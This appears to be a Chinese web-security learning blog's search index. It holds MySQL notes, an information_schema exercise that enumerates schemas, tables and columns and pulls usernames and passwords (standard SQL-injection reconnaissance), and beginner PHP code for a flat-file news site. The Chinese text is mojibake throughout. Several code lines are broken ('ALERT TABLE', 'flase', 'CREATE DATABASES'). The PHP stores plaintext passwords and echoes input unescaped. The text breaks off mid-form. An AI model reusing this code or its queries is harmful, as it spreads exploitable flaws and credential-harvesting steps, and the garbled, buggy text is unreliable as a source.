<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[welcome]]></title>
    <url>%2F2019%2F08%2F13%2Fwelcome%2F</url>
    <content type="text"><![CDATA[]]></content>
  </entry>
  <entry>
    <title><![CDATA[ç»ƒä¹ 6]]></title>
    <url>%2F2019%2F08%2F12%2Fpractice6%2F</url>
    <content type="text"><![CDATA[Abstract: MySQLä¸­information_schemaåº“çš„ä½¿ç”¨ 1SELECT schema_name FROM information_schema.schemata; OUT æ˜¾ç¤ºå‡ºæ‰€æœ‰åº“åã€‚ 1SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;mynews&apos;; OUT æ˜¾ç¤ºå‡ºmynewsåº“ä¸­æ‰€æœ‰è¡¨åã€‚ 1SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;test&apos;; OUT æ‰¾åˆ°ç›®æ ‡ï¼Œå‘çŽ°teståº“ä¸­æœ‰ä¸¤å¼ è¡¨contentå’Œusersã€‚ 1SELECT column_name FROM information_schema.columns WHERE table_name=&apos;users&apos;; æ˜¾ç¤ºå‡ºusersè¡¨ä¸­çš„å­—æ®µã€‚ 1SELECT username, passwd FROM test.users; OUT 1SELECT column_name FROM information_schema.columns WHERE table_name=&apos;content&apos;; æ˜¾ç¤ºå‡ºcontentè¡¨ä¸­çš„å­—æ®µã€‚ OUT]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note21]]></title>
    <url>%2F2019%2F08%2F12%2Fnote21%2F</url>
    <content type="text"><![CDATA[Abstract: å¯¹MySQLæ•°æ®åº“çš„ç®€å•ä»‹ç»å’ŒåŸºæœ¬æ“ä½œåŒ…æ‹¬åˆ›å»ºæ•°æ®åº“ï¼Œè¯»å–æ•°æ®åº“ä¿¡æ¯ï¼Œåˆ›å»ºè¡¨ï¼Œå¯¹è¡¨ä¸­çš„æ•°æ®è¿›è¡Œå¢žåˆ æ”¹æŸ¥ã€‚ä»¥åŠå¯¹information_schemaè¡¨çš„ç†è§£ã€‚ ä¸€ã€MySQLæ•°æ®åº“MySQLæ˜¯æµè¡Œçš„å…³ç³»åž‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚ æ•°æ®åº“ï¼šä¸€äº›å…³è”è¡¨çš„é›†åˆã€‚ æ•°æ®è¡¨ï¼šæ˜¯æ•°æ®çš„çŸ©é˜µã€‚ åˆ—ï¼šä¸€åˆ—åŒ…å«ç›¸åŒç±»åž‹çš„æ•°æ®ï¼Œä¾‹å¦‚ç”¨æˆ·åæ•°æ®ã€‚ è¡Œï¼šä¸€è¡Œæ˜¯ä¸€ç»„ç›¸å…³æ•°æ®ï¼Œä¾‹å¦‚ä¸€æ¡ç”¨æˆ·è®¢é˜…çš„æ•°æ®ã€‚ ä¸»é”®ï¼šä¸»é”®æ˜¯å”¯ä¸€çš„ï¼Œä¸€ä¸ªæ•°æ®è¡¨ä¸­åªèƒ½åŒ…å«ä¸€ä¸ªä¸»é”®ã€‚å¯ä»¥ç”¨ä¸»é”®æŸ¥è¯¢æ•°æ®ã€‚ å¤–é”®ï¼šå¤–é”®ç”¨äºŽå…³è”ä¸¤ä¸ªè¡¨ã€‚ äºŒã€MySQLåŸºç¡€åº”ç”¨1. å…³äºŽæ•°æ®åº“123456#åˆ›å»ºæ•°æ®åº“CREATE DATABASE mytest;#æŸ¥çœ‹æ•°æ®åº“SHOW DATABASES;#ä½¿ç”¨æ•°æ®åº“USE mytest; 2. å…³äºŽæ•°æ®è¡¨1234567891011121314151617181920212223#åˆ›å»ºä¸€ä¸ªåä¸ºuserçš„æ•°æ®è¡¨CREATE TABLE `user`( `id` SMALLINT, `username` VARCHAR(20),);#æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„æ•°æ®è¡¨SHOW TABLES;#æŸ¥çœ‹åˆ›å»ºæ•°æ®åº“æ—¶çš„æè¿°SHOW CREATE TABLE user;#å‘userè¡¨ä¸­æ’å…¥ä¸€æ¡æ•°æ®INSERT user VALUES(&apos;1&apos;, &apos;admin&apos;);#å‘userè¡¨ä¸­æ’å…¥ä¸€æ¡è®°å½•åªåŒ…å«åå­—çš„ä¿¡æ¯INSERT user(`username`) VALUES(&quot;cat&quot;);#å‘userè¡¨ä¸­åŒæ—¶æ’å…¥å¤šæ¡è®°å½•INSERT user VALUES(&apos;2&apos;, &apos;zs&apos;), (&apos;3&apos;, &apos;ww&apos;);#æŸ¥çœ‹æ•°æ®è¡¨ä¸­çš„æ‰€æœ‰è®°å½•SELECT * FROM user;#ä¿®æ”¹æ•°æ®è¡¨å§“åALERT TABLE admin RENAME TO nimda;#æ›´æ”¹æ•°æ®UPDATE nimda SET `id`=4;#åˆ é™¤æ•°æ®è¡¨DROP TABLE user; åº“å è¡¨å å­—æ®µ ç”¨æˆ·åtb_users åå­—ã€å¯†ç ã€é‚®ç®±ã€æ˜µç§°ã€åˆ›å»ºæ—¶é—´ç­‰ mynews æ–°é—»è¡¨tb_news æ ‡é¢˜ã€å†…å®¹ã€ä½œè€… è¯„è®ºè¡¨tb_comment æ–°é—»idã€è¯„è®ºå†…å®¹ã€è¯„è®ºç”¨æˆ· 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#åˆ›å»ºæ–°çš„æ•°æ®åº“CREATE DATABASES mynews;#æŸ¥çœ‹æ•°æ®åº“SHOW DATABASE;#ä½¿ç”¨mynewsåº“USE mynews;#åˆ›å»ºä¸€ä¸ªåä¸ºtb_usersè¡¨CREATE TABLE `tb_users`( #idéžç©ºè‡ªå¢ž `id` int(10) NOT NULL AUTO_INCREMENT, #ç”¨æˆ·åéžç©ºå”¯ä¸€ `username` VARCHAR(50) NOT NULL UNIQUE, `password` VARCHAR(50) NOT NULL, `email` VARCHAR(50) NULL UNIQUE, `nickname` VARCHAR(50) NOT NULL, `safepoint` VARCHAR(50) NULL, #å¤´åƒé»˜è®¤ `avatarimg` VARCHAR(100) DEFAULT &apos;/images/default_avatar.jpg&apos;, #æ—¶é—´ `reg_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP(), `lastlogin_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP(), `lastlogin_ip` VARCHAR(255) NULL, PRIMARY KEY(`id`));#å‘tb_usersè¡¨æ’å…¥ä¸€æ¡æ•°æ®INSERT INTO `mynews`.`tb_users`(`username`, `password`, `email`, `nickname`) VALUES (&apos;zs&apos;, &apos;zs123&apos;, &apos;zs123@icq.com&apos;, &apos;zs123&apos;)#åˆ›å»ºä¸€ä¸ªåä¸ºtb_newsè¡¨create table `tb_news`( `id` int(0) not null auto_increment, `title` varchar(255) not null, `contents` text not null, `author` varchar(50) not null, `new_img` varchar(100) null, `add_time` timestamp default current_timestamp(), `hot` int(0) default 0, primary key(`id`));#å‘tb_newsè¡¨æ’å…¥æ•°æ®INSERT INTO `mynews`.`tb_news`(`title`, `contents`, `author`) VALUES (&apos;æ‰“å®Œå®½é¢&apos;, &apos;åƒé¢ï¼åƒé¢ï¼&apos;, &apos;zs&apos;);INSERT INTO `mynews`.`tb_news`(`title`, `contents`, `author`) VALUES (&apos;é¸¡ä½ å¤ªç¾Ž&apos;, &apos;å¤ªç¾Žï¼å¤ªç¾Žï¼&apos;, &apos;ww&apos;);#åˆ›å»ºä¸€ä¸ªåä¸ºtb_commentè¡¨create table `tb_comment`( `id` int(0) not null auto_increment, `new_id` int(0) not null, `comment_content` text not null, `comment_user` varchar(50) not null, `comment_time` timestamp default current_timestamp(), primary key(`id`));#å‘tb_commentè¡¨æ’å…¥æ•°æ®INSERT INTO `mynews`.`tb_comment`(`new_id`, `comment_content`, `comment_user`) VALUES (&apos;1&apos;, &apos;å´äº¦å‡¡&apos;, &apos;ww&apos;);INSERT INTO `mynews`.`tb_comment`(`new_id`, `comment_content`, `comment_user`) VALUES (&apos;2&apos;, &apos;å¤å¤&apos;, &apos;zs&apos;);#ä¿®æ”¹æ•°æ®UPDATE `mynews`.`tb_news` SET `author` = &apos;ls&apos; WHERE `id` = 1;UPDATE `tb_comment` SET `comment_content` = &apos;è”¡å¾å¤&apos; WHERE `id` = 2;ALTER TABLE `mynews`.`tb_users` ADD UNIQUE (`username`); ä¸‰ã€information_schemainformation_schemaè¿™ä¸ªæ•°æ®åº“ä¸­ä¿å­˜äº†MySQLæœåŠ¡å™¨æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨ä¸­çš„æ•°æ®ç±»åž‹ä¸Žè®¿é—®æƒé™ç­‰ã€‚ è¡¨å å­—æ®µä½œç”¨ schemata schema_nameè®°å½•äº†æ‰€æœ‰æ•°æ®åº“çš„åå­— tables table_schemaè®°å½•äº†æ‰€æœ‰æ•°æ®åº“çš„åå­— tables table_nameè®°å½•äº†æ‰€æœ‰æ•°æ®åº“çš„è¡¨çš„åå­— columns table_schemaè®°å½•äº†æ‰€æœ‰æ•°æ®åº“çš„åå­— columns table_nameè®°å½•äº†æ‰€æœ‰æ•°æ®åº“çš„è¡¨åå­— columns column_nameè®°å½•äº†æ‰€æœ‰æ•°æ®åº“çš„è¡¨çš„åˆ—çš„åå­— æŸ¥è¯¢æ•°æ®æ ¸å¿ƒè¯­æ³•ï¼š åŠŸèƒ½åç§° æŸ¥è¯¢è¯­å¥ æŸ¥åº“ SELECT schema_name FROM information_schema.schemata æŸ¥è¡¨ SELECT table_name FROM information_schema.tables WHERE table_schema=åº“å æŸ¥åˆ— SELECT column_name FROM information_schema.columns WHERE table_name=è¡¨æ˜Ž æŸ¥æ•°æ® SELECT åˆ—å FROM åº“å.è¡¨å 12mysql -uroot -p mynews &lt; pathmysqldump -uroot -p mysql &gt; path]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç»ƒä¹ 5]]></title>
    <url>%2F2019%2F08%2F11%2Fpractice5%2F</url>
    <content type="text"><![CDATA[Abstract: æŠŠæ–°é—»ä¿¡æ¯ï¼Œç”¨æˆ·ä¿¡æ¯å­˜æ”¾åœ¨æ–‡ä»¶ä¸­ï¼Œç”¨å¯¹æ–‡ä»¶çš„è¯»å†™ï¼Œå®žçŽ°ç”¨æˆ·çš„ç™»å½•æ³¨å†Œä»¥åŠå¯¹æ–°é—»çš„å¢žåˆ æ”¹æŸ¥ã€‚ ä¸€ã€ç›®å½•ç»“æž„ ###ç›®å½•ç»“æž„ï¼š | index.php //åˆå§‹åŒ–é¡µé¢ |â€”â€”â€“ data //æ–‡ä»¶å­˜æ”¾ç›®å½• | news.db //å­˜æ”¾æ–°é—»ä¿¡æ¯æ–‡ä»¶ | users.db //å­˜æ”¾ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶ |â€”â€”â€” lib //è„šæœ¬å­˜æ”¾ç›®å½• | login.html // ç”¨æˆ·ç™»å½•ç•Œé¢ | checklogin.php //å¤„ç†ç”¨æˆ·ç™»å½•ä¿¡æ¯ | logup.html //ç”¨æˆ·æ³¨å†Œç•Œé¢ | checkSignUp.php //å¤„ç†ç”¨æˆ·æ³¨å†Œä¿¡æ¯ | addNews.php //æ·»åŠ æ–°é—»ç•Œé¢ | del.php //åˆ é™¤æ–°é—»ç•Œé¢ | upload.php //ä¸Šä¼ å¤´åƒç•Œé¢ | getpasswd.php //ä¿®æ”¹å¯†ç ç•Œé¢ | checkpass.php //å¯¹hgetpasswd.phpå‘é€çš„æ•°æ®è¿›è¡Œå¤„ç† |â€”â€”â€“ css //ç”¨æˆ·ç™»å½•å’Œæ³¨å†Œç•Œé¢çš„cssç›®å½• | login.css //ç”¨æˆ·ç™»å½•çš„css | logup.css //ç”¨æˆ·æ³¨å†Œçš„css |â€”â€”â€“ upload //ç”¨æˆ·ä¸Šä¼ å¤´åƒç›®å½• |â€”â€”â€“ basedir //å­˜æ”¾é¡µé¢å¤´éƒ¨å°¾éƒ¨å’Œä¸€äº›å…¬å…±å‡½æ•° | header.php //é¡µé¢å¤´éƒ¨ | footer.php //é¡µé¢å°¾éƒ¨ | function.php //å®šä¹‰äº†ä¸€äº›å…¬å…±å‡½æ•° äºŒã€æ–°é—»ç•Œé¢ index.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?phpsession_start();?&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;news&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;!--åŒºåˆ†æ™®é€šç”¨æˆ·å’Œç®¡ç†å‘˜ç”¨æˆ·--&gt;&lt;?php if(isset($_SESSION[&apos;uname&apos;]))&#123; echo &lt;&lt;&lt;EOF &lt;div&gt; &lt;img src=&quot;../images/logo.png&quot; height=&quot;100px&quot; width=&quot;100px&quot; style=&quot;float: left&quot;&gt; &lt;/div&gt; &lt;div style=&quot;float: right&quot;&gt; &lt;img src=&apos;../upload/headimg.jpg&apos; height=&quot;60px&quot; width=&quot;60px&quot;&gt; &lt;br&gt; &lt;a href=&quot;../logout.php&quot;&gt;æ³¨é”€ç”¨æˆ·&lt;/a&gt; &lt;/div&gt;EOF;&#125;?&gt;&lt;h1 align=&quot;center&quot;&gt;ICQæ–°é—»ä¸­å¿ƒ&lt;/h1&gt;&lt;hr&gt;&lt;table align=&quot;center&quot;&gt; &lt;tr&gt; &lt;th&gt;çƒ­åº¦&lt;/th&gt; &lt;th&gt;æ ‡é¢˜&lt;/th&gt; &lt;th&gt;ä½œè€…&lt;/th&gt; &lt;th&gt;æ—¶é—´&lt;/th&gt; &lt;/tr&gt; &lt;?php //ç”¨åªè¯»æ–¹å¼æ‰“å¼€news.dbæ–‡ä»¶ $fhandle = fopen(&quot;./data/news1.db&quot;, &quot;r&quot;); //è®¾ç½®ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå°äºŽ3æ—¶ï¼Œæ¯ä¸ªæ–‡ç« æ ‡é¢˜ä¸‹é¢å¢žåŠ å›¾ç‰‡å’Œç®€ä»‹ $top3Cnt=1; while(!feof($fhandle)) &#123; $fline = fgets($fhandle); $data = explode(&apos;||&apos;, $fline); @$title = base64_decode($data[1]); @$content = base64_decode($data[2]); @$date = $data[3]; @$author = base64_decode($data[4]); @$hot = $data[5]; @$imgUrl = $data[6]; echo &lt;&lt;&lt;EOF &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;$hot&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;myl.php&quot;&gt;$title&lt;/a&gt;&lt;/td&gt; &lt;td&gt;$author&lt;/td&gt; &lt;td&gt;$date&lt;/td&gt; &lt;/tr&gt;EOF; //æ–°é—»å‰ä¸‰ä¸ªæ˜¾ç¤ºå›¾ç‰‡å’Œç®€ä»‹ if($top3Cnt&lt;=3)&#123; $tmpContent = mb_substr(base64_decode($data[2]), 0,50); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td&gt;&lt;img src=&quot;$imgUrl&quot; height=&quot;80&quot; width=&quot;80&quot;&gt;&lt;/td&gt; &lt;td colspan=&apos;4&apos;&gt;&lt;b&gt;å†…å®¹ç®€ä»‹ï¼š&lt;/b&gt;$tmpContent&lt;/td&gt; &lt;/tr&gt;EOF; &#125; $top3Cnt++; &#125; ?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; æ™®é€šç”¨æˆ·æ˜¾ç¤ºç•Œé¢ï¼š ç®¡ç†å‘˜ç”¨æˆ·æ˜¾ç¤ºç•Œé¢ï¼š ä¸‰ã€ç”¨æˆ·ç™»å½•å’Œç”¨æˆ·æ³¨å†Œ1.login.html1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;ç™»å½•é¡µé¢&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/login.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;top&quot;&gt; &lt;h1&gt;ç™»å½•&lt;/h1&gt; &lt;/div&gt; &lt;form action=&quot;checklogin.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;æ‰‹æœºå·/é‚®ç®±/ç”¨æˆ·å&quot;&gt; &lt;br&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;å¯†ç &quot;&gt; &lt;br&gt; &lt;input class=&quot;input_code&quot; type=&quot;text&quot; name=&quot;verifycode&quot; placeholder=&quot;éªŒè¯ç &quot;&gt; &lt;img class=&quot;verifycode&quot; src=&quot;https://passport.360.cn/captcha.php?m=create&amp;app=i360&amp;scene=login&amp;userip=&amp;level=default&amp;sign=8820a4&amp;r=1564540365&amp;border=none&amp;_=1564540365972&quot;&gt; &lt;br&gt; &lt;a class=&quot;signup&quot; href=&quot;logup.html&quot;&gt;æ³¨å†Œè´¦å·&lt;/a&gt; &lt;a class=&quot;getpass&quot; href=&quot;./tmp/getpasswd.php&quot;&gt;å¿˜è®°å¯†ç &lt;/a&gt; &lt;br&gt; &lt;input class=&quot;login&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ç™»å½•&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 2.checklogin.php12345678910111213141516171819202122232425262728293031323334353637&lt;?php session_start();?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; ç™»å½• &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$fhandle = fopen(&apos;./data/users.db&apos;, &apos;r&apos;);while(!feof($fhandle)) &#123; $InMes = fgets($fhandle); $mesArray = explode(&apos;||&apos;, $InMes); if(count($mesArray)!=2)&#123; continue; &#125; if(trim($mesArray[0])==$_POST[&apos;username&apos;] &amp;&amp; trim($mesArray[1])==$_POST[&apos;password&apos;])&#123; $_SESSION[&apos;uname&apos;] = $_POST[&apos;username&apos;]; echo &quot;æ­£åœ¨è¿›å…¥åŽå°&quot;; echo &lt;&lt;&lt;EOF &lt;script&gt;location.href=&quot;./data/addNews.php&quot;&lt;/script&gt;EOF; $flag=0; break; &#125; $flag = 1;&#125;if($flag==1)&#123; echo &quot;&lt;script&gt;alert(&apos;è´¦å·æˆ–å¯†ç é”™è¯¯ï¼é‡æ–°è¾“å…¥ã€‚&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;&#125;?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ç™»å½•æˆåŠŸç•Œé¢ï¼š ç™»å½•å¤±è´¥ç•Œé¢ï¼š 3. checklogup.phplogup.htmlä¸Žlogin.htmlç¨‹åºæŽ¥è¿‘ 12345678910111213141516171819202122232425&lt;?phpsession_start();$fhandle = fopen(&apos;./data/users.db&apos;, &apos;a+&apos;);$userMes = array();$storeMes = array();@$userMes[0] = $_POST[&apos;username&apos;];@$userMes[1]=$_POST[&apos;password&apos;];@$userMes[2]=$_POST[&apos;checkpasswd&apos;];if(strcmp($userMes[1], $userMes[2])!=0)&#123; echo &quot;&lt;script&gt;alert(&apos;ä¸¤æ¬¡è¾“å‡ºå¯†ç ä¸åŒï¼è¯·é‡æ–°è¾“å…¥ï¼&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;&#125;else &#123; $storeMes[0] = $userMes[0]; $storeMes[1] = $userMes[1]; $inMes = implode(&apos;||&apos;, $storeMes); if (count($userMes) == 3) &#123; fputs($fhandle, $inMes . &quot;\n&quot;); fclose($fhandle); echo &quot;&lt;script&gt;alert(&apos;ç”¨æˆ·æ³¨å†ŒæˆåŠŸ&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;location.href=&apos;login.html&apos;&lt;/script&gt;&quot;; $_SESSION[&apos;uname&apos;] = $_POST[&apos;username&apos;]; &#125;&#125;?&gt; ç”¨æˆ·æ³¨å†Œå¤±è´¥ï¼š ç”¨æˆ·æ³¨å†ŒæˆåŠŸï¼š å››ã€æ–°é—»çš„å¢žåˆ æ”¹æŸ¥1. æ·»åŠ æ–°é—» addNews.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!--æ·»åŠ å¤´éƒ¨ä¿¡æ¯--&gt;&lt;?php include &apos;../basedir/header.php&apos;; include &apos;../basedir/function.php&apos;;?&gt;&lt;div align=&quot;center&quot;&gt; &lt;?php if($_SESSION[&apos;uname&apos;]==NULL) &#123; echo &quot;&lt;script&gt;alert(&apos;è¯·ç™»å½•&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; die(&quot;è¯·ç™»å½•&quot;); &#125; ?&gt; &lt;a href=&quot;upload.php&quot;&gt;ä¸Šä¼ å¤´åƒ&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;del.php&quot;&gt;åˆ é™¤æ–°é—»&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;getpasswd.php&quot;&gt;ä¿®æ”¹å¯†ç &lt;/a&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=&quot;center&quot;&gt; &lt;form action=&quot;addNews.php&quot; method=&quot;post&quot;&gt; &lt;?php if($_SESSION[&apos;uname&apos;]==NULL) echo &quot;&lt;script&gt;alert(&apos;è¯·ç™»å½•&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; die(&quot;è¯·ç™»å½•&quot;); ?&gt; &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;æ–‡ç« æ ‡é¢˜&quot;&gt;&lt;br&gt; &lt;br&gt; &lt;input type=&quot;number&quot; name=&quot;hot&quot; placeholder=&quot;çƒ­åº¦&quot;&gt;&lt;br&gt; &lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;imgUrl&quot;&gt;&lt;br&gt; &lt;br&gt; &lt;textarea name=&quot;content&quot; cols=&quot;100&quot; rows=&quot;50&quot; placeholder=&quot;æ–‡ç« å†…å®¹&quot;&gt;&lt;/textarea&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;?php $fhandle = fopen(&apos;../data/news2.db&apos;, &apos;a&apos;); $t = time(); $arrMes = array(); @$arrMes[0] = computerId(&apos;../data/news2.db&apos;)+1; @$arrMes[1] = base64_encode($_POST[&apos;title&apos;]); @$arrMes[2] = base64_encode($_POST[&apos;content&apos;]); @$arrMes[3] = date(&quot;Y-m-d&quot;, $t); @$arrMes[4] = base64_encode($_SESSION[&quot;username&quot;]); @$arrMes[5] = $_POST[&apos;hot&apos;]; @$arrMes[6] = $_POST[&apos;imgUrl&apos;]; if (count($arrMes) == 7) &#123; $writeMes = implode(&apos;||&apos;, $arrMes); $fline = fputs($fhandle, $writeMes.&quot;\n&quot;); if ($fline != flase) &#123; echo &quot;&lt;script&gt;alert(\&quot;æ–°é—»æ·»åŠ æˆåŠŸï¼\&quot;)&lt;/script&gt;&quot;; echo &quot;&lt;a href=&apos;../index.php&apos;&gt;ç‚¹å‡»æŸ¥çœ‹&lt;/a&gt;&quot;; &#125; &#125; fclose($fhandle);?&gt;&lt;!--æ·»åŠ å°¾éƒ¨ä¿¡æ¯--&gt;&lt;?php include &quot;../basedir/footer.php&quot;;?&gt; æ·»åŠ æ–°é—»é¡µé¢ï¼š 2. åˆ é™¤æ–°é—» del.phpæ€è·¯ï¼šæ¯æ¡æ–°é—»å¯¹åº”ä¸€ä¸ªidå·ï¼Œé€šè¿‡è¾“å…¥idåˆ¤æ–­è¦åˆ é™¤çš„æ–°é—»ï¼Œç¨‹åºå¾ªçŽ¯è¯»å–æ–‡ä»¶æ¯ä¸€è¡Œæ•°æ®ï¼Œå†é€šè¿‡å­—ç¬¦ä¸²å‡½æ•°æŠŠidå·å–å‡ºï¼Œè‹¥idä¸åŒ¹é…æŠŠæ¯è¡Œæ•°æ®pushåˆ°ä¸€ä¸ªæ•°ç»„é‡Œé¢ï¼Œè‹¥ç›¸ç­‰åˆ™è·³è¿‡ã€‚ç„¶åŽå†é€šè¿‡forå¾ªçŽ¯æŠŠå­˜å…¥æ•°æ®çš„æ•°ç»„ä»¥wæ ¼å¼é‡æ–°å†™å…¥æ–‡ä»¶å³å¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?php include &apos;../basedir/header.php&apos;; include &apos;../basedir/function.php&apos;;?&gt; &lt;?php if($_SESSION[&apos;uname&apos;]==NULL) echo &quot;&lt;script&gt;alert(&apos;è¯·ç™»å½•&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; ?&gt; &lt;div align=&quot;center&quot;&gt; &lt;a href=&quot;upload.php&quot;&gt;ä¸Šä¼ å¤´åƒ&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;../data/addNews.php&quot;&gt;æ·»åŠ æ–°é—»&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;getpasswd.php&quot;&gt;ä¿®æ”¹å¯†ç &lt;/a&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;form action=&quot;del.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;id&quot; placeholder=&quot;è¯·è¾“å…¥è¦åˆ é™¤æ–‡ç« çš„ç¼–å·&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;/form&gt; &lt;a href=&quot;../index.php&quot; target=&quot;_blank&quot;&gt;ç‚¹å‡»æŸ¥çœ‹&lt;/a&gt; &lt;/div&gt;&lt;table&gt; &lt;table align=&quot;center&quot;&gt; &lt;tr&gt; &lt;th&gt;æ ‡å·&lt;/th&gt; &lt;th&gt;æ ‡é¢˜&lt;/th&gt; &lt;th&gt;ä½œè€…&lt;/th&gt; &lt;/tr&gt; &lt;?php $f = fopen(&apos;../data/news1.db&apos;, &apos;r&apos;); while(!feof($f))&#123; $fline = fgets($f); $data = explode(&apos;||&apos;, $fline); @$artId = $data[0]; @$title = base64_decode($data[1]); @$author = base64_decode($data[4]); echo &lt;&lt;&lt;EOF &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;$artId&lt;/td&gt; &lt;td&gt;$title&lt;/td&gt; &lt;td&gt;$author&lt;/td&gt; &lt;/tr&gt;EOF; &#125; ?&gt;&lt;/table&gt;&lt;?php @$id = $_POST[&apos;id&apos;]; $fhandle = fopen(&apos;../data/news1.db&apos;, &apos;r&apos;); $transArr = array(); while(!feof($fhandle))&#123; $fline = fgets($fhandle); $tmpLine = explode(&apos;||&apos;, $fline); if($tmpLine[0] == $id)&#123; continue; &#125; array_push($transArr, $tmpLine); &#125; fclose($fhandle); for($i=0; $i&lt;count($transArr); $i++) &#123; echo &quot;&lt;br&gt;&quot;; &#125; echo &quot;&lt;br&gt;&quot;; $fhandle = fopen(&apos;../data/news1.db&apos;, &apos;w&apos;); for($i=0; $i&lt;count($transArr); $i++) &#123; if(count($transArr[$i])==7) &#123; $transArr[$i][0] = $i + 1; $str = implode(&apos;||&apos;, $transArr[$i]); if($str==&quot;\n&quot;)&#123; continue; &#125; fputs($fhandle, $str); &#125; &#125; if(isset($_POST[&apos;id&apos;])) &#123; if (count($transArr) == computerId(&apos;../data/news1.db&apos;)) &#123; echo &quot;&lt;script&gt;alert(&apos;åˆ é™¤æˆåŠŸ&apos;); location.href=&apos;../tmp/del.php&apos;;&lt;/script&gt;&quot;; &#125; &#125; fclose($fhandle);?&gt;&lt;?php include &quot;../basedir/footer.php&quot;;?&gt; æ·»åŠ å¥½æ–°é—»åŽï¼Œç‚¹å‡»åˆ é™¤æ–°é—»å¯ä»¥è¿›å…¥åˆ é™¤æ–°é—»ç•Œé¢ 3. ä¿®æ”¹å¯†ç getpasswd.php 1234567891011121314151617181920&lt;?php include &apos;../basedir/header.php&apos;; include &apos;../basedir/function.php&apos;;?&gt;&lt;div align=&quot;center&quot;&gt; &lt;?php if($_SESSION[&apos;uname&apos;]==NULL) &#123; echo &quot;&lt;script&gt;alert(&apos;è¯·ç™»å½•&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; die(&quot;è¯·ç™»å½•&quot;); &#125; ?&gt; &lt;a href=&quot;upload.php&quot;&gt;ä¸Šä¼ å¤´åƒ&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;../data/addNews.php&quot;&gt;æ·»åŠ æ–°é—»&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;del.php&quot;&gt;åˆ é™¤æ–°é—»&lt;/a&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;form action=&quot;checkpass.php&quot; method=&quot;post&quot;&gt; &lt;label&gt;è¾“å…¥æ—§å¯†ç ï¼š&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;oldpasswd&quot;&gt; &lt;label&gt;è¾“å…¥æ–°å¯†ç ï¼š&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;newpasswd&quot;&gt; &lt;label&gt;ç¡®è®¤å¯†ç 